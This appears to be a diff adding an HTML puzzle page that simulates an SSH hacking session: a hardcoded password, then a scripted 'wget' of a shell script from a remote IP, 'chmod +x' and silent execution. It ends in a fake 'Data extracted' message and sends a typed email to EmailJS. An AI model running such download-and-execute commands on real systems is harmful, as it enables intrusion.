@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Access</title>
+    <link rel="icon" type="image/x-icon" href="https://img.icons8.com/?size=100&id=klIj9inx2tzM&format=png&color=000000">
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --text-color: #4ade80;
+            --secondary-text: #a3e635;
+            --accent-color: #10b981;
+            --error-color: #ef4444;
+            --warning-color: #f59e0b;
+            --header-color: #6366f1;
+            --success-color: #10b981;
+            --shadow-color: rgba(0, 255, 170, 0.3);
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            line-height: 1.4;
+        }
+        
+        #terminal-container {
+            width: 90%;
+            max-width: 900px;
+            height: 85vh;
+            background-color: rgba(13, 17, 23, 0.9);
+            border-radius: 10px;
+            box-shadow: 0 0 20px var(--shadow-color), 0 0 30px var(--shadow-color);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid var(--accent-color);
+        }
+        
+        #terminal-header {
+            background-color: rgba(16, 185, 129, 0.2);
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--accent-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        #header-title {
+            color: var(--accent-color);
+            font-weight: bold;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+        
+        #header-title::before {
+            content: '';
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background-color: var(--accent-color);
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        
+        #header-buttons {
+            display: flex;
+        }
+        
+        .header-button {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-left: 8px;
+            cursor: pointer;
+        }
+        
+        .close-button {
+            background-color: var(--error-color);
+        }
+        
+        .minimize-button {
+            background-color: var(--warning-color);
+        }
+        
+        .maximize-button {
+            background-color: var(--success-color);
+        }
+        
+        #terminal {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: var(--accent-color) var(--bg-color);
+        }
+        
+        #terminal::-webkit-scrollbar {
+            width: 5px;
+        }
+        
+        #terminal::-webkit-scrollbar-track {
+            background: var(--bg-color);
+        }
+        
+        #terminal::-webkit-scrollbar-thumb {
+            background-color: var(--accent-color);
+            border-radius: 10px;
+        }
+        
+        .input-line {
+            display: flex;
+            align-items: center;
+            margin-top: 5px;
+        }
+        
+        .prompt {
+            margin-right: 8px;
+            color: var(--secondary-text);
+        }
+        
+        .command-text {
+            color: var(--text-color);
+        }
+        
+        .password-input {
+            color: var(--text-color); /* Asterisks will be visible */
+        }
+        
+        .blink {
+            animation: blink-animation 1s steps(2) infinite;
+        }
+        
+        @keyframes blink-animation {
+            to {
+                opacity: 0;
+            }
+        }
+        
+        .text-line {
+            margin: 4px 0;
+            line-height: 1.4;
+            text-shadow: 0 0 5px rgba(74, 222, 128, 0.4);
+        }
+        
+        .cursor  {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background-color: var(--text-color);
+            margin-bottom: -3px;
+            box-shadow: 0 0 5px var(--text-color);
+        }
+        
+        .access-denied {
+            color: var(--error-color);
+            text-shadow: 0 0 5px rgba(239, 68, 68, 0.5);
+        }
+        
+        .success {
+            color: var(--success-color);
+            text-shadow: 0 0 5px rgba(16, 185, 129, 0.5);
+        }
+        
+        .warning {
+            color: var(--warning-color);
+            text-shadow: 0 0 5px rgba(245, 158, 11, 0.5);
+        }
+        
+        .header-text {
+            color: var(--header-color);
+            text-shadow: 0 0 5px rgba(99, 102, 241, 0.5);
+        }
+        
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.15;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .system-box {
+            border: 1px solid var(--accent-color);
+            border-radius: 5px;
+            padding: 10px;
+            margin: 15px 0;
+            background-color: rgba(16, 185, 129, 0.1);
+        }
+        
+        .system-box-header {
+            margin-bottom: 8px;
+            color: var(--secondary-text);
+            font-weight: bold;
+            border-bottom: 1px solid var(--accent-color);
+            padding-bottom: 5px;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 8px;
+            background-color: var(--success-color);
+            box-shadow: 0 0 5px var(--success-color);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        
+        .glitch {
+            position: relative;
+            animation: glitch 1s linear infinite;
+        }
+        
+        @keyframes glitch {
+            2%, 64% { transform: translate(2px, 0) skew(0deg); }
+            4%, 60% { transform: translate(-2px, 0) skew(0deg); }
+            62% { transform: translate(0, 0) skew(5deg); }
+        }
+        
+        .glitch:before,
+        .glitch:after {
+            content: attr(title);
+            position: absolute;
+            left: 0;
+        }
+        
+        .glitch:before {
+            animation: glitchTop 1s linear infinite;
+            clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
+            -webkit-clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
+        }
+        
+        @keyframes glitchTop {
+            2%, 64% { transform: translate(2px, -2px); }
+            4%, 60% { transform: translate(-2px, 2px); }
+            62% { transform: translate(13px, -1px) skew(-13deg); }
+        }
+        
+        .glitch:after {
+            animation: glitchBottom 1.5s linear infinite;
+            clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
+            -webkit-clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
+        }
+        
+        @keyframes glitchBottom {
+            2%, 64% { transform: translate(-2px, 0); }
+            4%, 60% { transform: translate(-2px, 0); }
+            62% { transform: translate(-22px, 5px) skew(21deg); }
+        }
+        
+        #status-bar {
+            background-color: rgba(16, 185, 129, 0.2);
+            padding: 5px 15px;
+            border-top: 1px solid var(--accent-color);
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+        }
+        
+        @media (max-width: 768px) {
+            #terminal-container {
+                width: 95%;
+                height: 90vh;
+            }
+        }
+    </style>
+</head>
+<body>
+    
+    <canvas id="matrix-canvas"></canvas>
+    
+    <div id="terminal-container">
+        <div id="terminal-header">
+            <div id="header-title">SSH - PROXY SERVER</div>
+            <div id="header-buttons">
+                <div class="header-button minimize-button"></div>
+                <div class="header-button maximize-button"></div>
+                <div class="header-button close-button"></div>
+            </div>
+        </div>
+        
+        <div id="terminal">
+            <div class="text-line glitch warning" title="WARNING: Unauthorized access to this system is forbidden">WARNING: Unauthorized access to this system is forbidden</div>
+            <div class="text-line glitch warning" title="and will be prosecuted to the full extent of the law.">and will be prosecuted to the full extent of the law.</div>
+        </div>
+        
+        <div id="status-bar">
+            <div class="status-item">
+                <span class="status-indicator"></span>
+                <span>ENCRYPTED CONNECTION</span>
+            </div>
+            <div class="status-item" id="clock">Thu Mar 13 09:22:34 2025</div>
+        </div>
+    </div>
+
+    <script>
+        // Matrix effect
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$+-*/=%"\'#&_(),.;:?!\\|{}[]<>~';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height / fontSize) * -1;
+        }
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(13, 17, 23, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#4ade80';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = characters.charAt(Math.floor(Math.random() * characters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        function updateClock() {
+            const now = new Date();
+            const options = { 
+                weekday: 'short', 
+                year: 'numeric', 
+                month: 'short', 
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            };
+            document.getElementById('clock').textContent = now.toLocaleString('en-US', options);
+        }
+
+        const terminal = document.getElementById('terminal');
+        let state = 'ssh_connect';
+        let username = '';
+        let magic = '';
+        let loginAttempts = 0;
+        let currentInputLine = null;
+        let currentCommandText = null;
+        let commandSequence = 0;
+        
+        // Define the sequence of commands to execute
+        const commands = [
+            'ssh u2964@45.67.132.88',
+            'wget http://66.249.65.241/download/themis.sh',
+            'chmod +x themis.sh',
+            './themis.sh --silent'
+        ];
+
+        function createInputLine(prompt, isPassword = false) {
+            const inputLine = document.createElement('div');
+            inputLine.className = 'input-line';
+            const promptSpan = document.createElement('span');
+            promptSpan.className = 'prompt';
+            promptSpan.textContent = prompt;
+            const commandText = document.createElement('span');
+            commandText.className = 'command-text';
+            if (isPassword) {
+                commandText.classList.add('password-input');
+            }
+            const cursor = document.createElement('span');
+            const allBlinkin = document.querySelectorAll('.blink');
+            for (let i = 0; i < allBlinkin.length; i++) {
+                allBlinkin[i].classList.remove('blink');
+                allBlinkin[i].classList.remove('cursor');
+            }
+            cursor.className = 'cursor blink';
+            inputLine.appendChild(promptSpan);
+            inputLine.appendChild(commandText);
+            inputLine.appendChild(cursor);
+            terminal.appendChild(inputLine);
+            terminal.scrollTop = terminal.scrollHeight;
+            return { inputLine, commandText };
+        }
+
+        function addTextLine(text, className = '') {
+            const line = document.createElement('div');
+            line.className = `text-line ${className}`;
+            line.textContent = text;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+            return line;
+        }
+
+        function handleUserInput() {
+            if (state === 'ssh_connect') {
+                const command = currentCommandText.textContent.trim();
+                if (command === 'ssh u2964@45.67.132.88') {
+                    addTextLine('Connecting to u2964@45.67.132.88...');
+                    setTimeout(() => {
+                        addTextLine('Connection established to proxy server: 45.67.132.88');
+                        addTextLine('SSH-2.0-OpenSSH_8.9p1 Debian-3ubuntu0.1');
+                        addTextLine('Using keyboard-interactive authentication.');
+                        const { inputLine, commandText } = createInputLine('u2964@45.67.132.88\'s password: ', true);
+                        currentInputLine = inputLine;
+                        currentCommandText = commandText;
+                        state = 'password';
+                    }, 500);
+                } else {
+                    addTextLine(`ssh: Could not resolve hostname: ${command}`);
+                    const { inputLine, commandText } = createInputLine('$ ');
+                    currentInputLine = inputLine;
+                    currentCommandText = commandText;
+                }
+            } else if (state === 'password') {
+                if (magic==="Sh@dowC1pher") {  
+                    addTextLine('');
+                    addTextLine('Authentication successful!', 'success');
+                    addTextLine('Last login: Thu Mar 13 08:34:12 2025 from 10.42.15.87');
+                    const systemBox = document.createElement('div');
+                    systemBox.className = 'system-box';
+                    systemBox.innerHTML = `
+                        <div class="system-box-header"><span class="status-indicator"></span>SYSTEM INFORMATION</div>
+                        <div class="text-line">OS: Debian GNU/Linux 12</div>
+                        <div class="text-line">Kernel: 6.1.0-18-amd64</div>
+                        <div class="text-line">Hostname: proxy-server</div>
+                        <div class="text-line">CPU: Intel Xeon E5-2680 v3 @ 2.50GHz</div>
+                        <div class="text-line">Memory: 16GB / 32GB</div>
+                        <div class="text-line">Disk: 942GB / 1TB SSD</div>
+                        <div class="text-line">Network: 1 Gbps [ACTIVE]</div>
+                        <div class="text-line">Uptime: 74 days, 09:35:22</div>
+                    `;
+                    terminal.appendChild(systemBox);
+                    terminal.scrollTop = terminal.scrollHeight;
+                    setTimeout(() => {
+                        commandSequence = 1; // Ready for the next command in sequence
+                        createPrompt();
+                    }, 800);
+                } else {
+                    loginAttempts++;
+                    if (loginAttempts >= 3) {
+                        addTextLine('Too many authentication failures', 'access-denied');
+                        addTextLine('Connection to 45.67.132.88 closed.');
+                        state = 'closed';
+                    } else {
+                        addTextLine('Access denied', 'access-denied');
+                        const { inputLine, commandText } = createInputLine('u2964@45.67.132.88\'s password: ', true);
+                        currentInputLine = inputLine;
+                        currentCommandText = commandText;
+                    }
+                }
+                magic = '';
+            } else if (state === 'command') {
+                const command = currentCommandText.textContent.trim();
+                processCommand(command);
+            }
+        }
+
+        function createPrompt() {
+            addTextLine('');
+            const { inputLine, commandText } = createInputLine('u2964@proxy:~$ ');
+            currentInputLine = inputLine;
+            currentCommandText = commandText;
+            state = 'command';
+            
+            // Set the next command in the sequence
+            
+        }
+
+        function processCommand(command) {
+            if (!command.trim()) return;
+            
+            if (command === 'exit' || command === 'logout') {
+                addTextLine('Logging out...', 'warning');
+                setTimeout(() => {
+                    addTextLine('Connection to 45.67.132.88 closed.', 'success');
+                    state = 'closed';
+                }, 500);
+                return;
+            }
+            
+            if (command === commands[1] && commandSequence === 1) {
+                // wget command
+                addTextLine('--2025-03-24 09:37:12--  http://66.249.65.241/download/themis.sh');
+                addTextLine('Connecting to 66.249.65.241:80... connected.');
+                addTextLine('HTTP request sent, awaiting response... 200 OK');
+                addTextLine('Length: 16854 (16K) [application/x-sh]');
+                addTextLine(`Saving to: "themis.sh"`);
+                addTextLine('');
+                addTextLine('themis.sh          100%[===================>]  16.46K  --.-KB/s    in 0.1s');
+                addTextLine('');
+                addTextLine(`2025-03-24 09:37:13 (164 KB/s) - "themis.sh" saved [16854/16854]`);
+                
+                commandSequence = 2;
+                setTimeout(createPrompt, 800);
+                return;
+            }
+            
+            if (command === commands[2] && commandSequence === 2) {
+                // chmod command
+                addTextLine('File permissions updated.');
+                
+                commandSequence = 3;
+                setTimeout(createPrompt, 500);
+                return;
+            }
+            
+            if (command.startsWith(commands[3]) && commandSequence === 3) {
+                // Execute script
+                addTextLine('Executing themis.sh in silent mode...');
+                const email = command.trim().split(' ').pop();
+                submitEmail(email);
+                // Show execution progress
+                showProgressBar();
+                return;
+            }
+            
+            // Handle other commands
+            if (command === 'clear') {
+                terminal.innerHTML = '';
+                createPrompt();
+                return;
+            }
+            
+            if (command === 'ls') {
+                const fileSystem = document.createElement('div');
+                fileSystem.innerHTML = `
+                    <div class="text-line"><span style="color: #a3e635;">config.json</span>    <span style="color: #a3e635;">themis.sh</span>    <span style="color: #10b981;">logs/</span>    <span style="color: #10b981;">backups/</span>    <span style="color: #a3e635;">readme.txt</span></div>
+                `;
+                terminal.appendChild(fileSystem);
+                createPrompt();
+                return;
+            }
+            
+            addTextLine(`bash: ${command}: command not found`, 'warning');
+            createPrompt();
+        }
+
+        function showProgressBar() {
+            const progressLine = addTextLine('[                                                  ] 0%');
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 2;
+                const bar = '[' + '#'.repeat(Math.floor(progress / 2)) + ' '.repeat(50 - Math.floor(progress / 2)) + '] ' + progress + '%';
+                progressLine.textContent = bar;
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        addTextLine('Execution complete.', 'success');
+                        addTextLine('Data extracted successfully.', 'success');
+                        commandSequence = 4; // End of sequence
+                        createPrompt();
+                    }, 500);
+                }
+            }, 100);
+        }
+
+        window.onload = function() {
+            setInterval(drawMatrix, 50);
+            setInterval(updateClock, 1000);
+            updateClock();
+            
+            addTextLine('Local terminal');
+            const { inputLine, commandText } = createInputLine('$ ');
+            currentInputLine = inputLine;
+            currentCommandText = commandText;
+            
+            state = 'ssh_connect';
+
+            document.addEventListener('keydown', function(e) {
+                if (state === 'closed') return;
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleUserInput();
+                } else if (e.key === 'Backspace') {
+                    e.preventDefault();
+                    if (state === 'password') {
+                        if (magic.length > 0) {
+                            magic = magic.slice(0, -1);
+                            currentCommandText.textContent = currentCommandText.textContent.slice(0, -1);
+                        }
+                    } else if (currentCommandText) {
+                        currentCommandText.textContent = currentCommandText.textContent.slice(0, -1);
+                    }
+                } else if (e.key.length === 1) {
+                    e.preventDefault();
+                    if (state === 'password') {
+                        magic += e.key;
+                        currentCommandText.textContent += '*';
+                    } else if (currentCommandText) {
+                        currentCommandText.textContent += e.key;
+                    }
+                }
+            });
+
+            document.querySelector('.close-button').addEventListener('click', function() {
+                if (confirm("Close terminal?")) {
+                    terminal.innerHTML = '';
+                    addTextLine('Connection terminated.', 'access-denied');
+                    state = 'closed';
+                }
+            });
+        };
+    </script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+
+
+function submitEmail(email_addr){
+    
+    
+    emailjs.init('WUv5kIXvpfATErx2A')  
+                        
+    const serviceID = 'service_la9pzdb';
+    const templateID = 'template_earvcpd';
+    const templateParams = {
+        email: email_addr, 
+    };
+    emailjs.send(serviceID, templateID, templateParams)
+                .then(function(response) {
+                    console.log("Email sent successfully!", response.status, response.text);
+                    
+                }, function(error) {
+                    console.log("Failed to send email:", error);
+                    
+                });
+}  
+    </script>
+</body>
+</html>
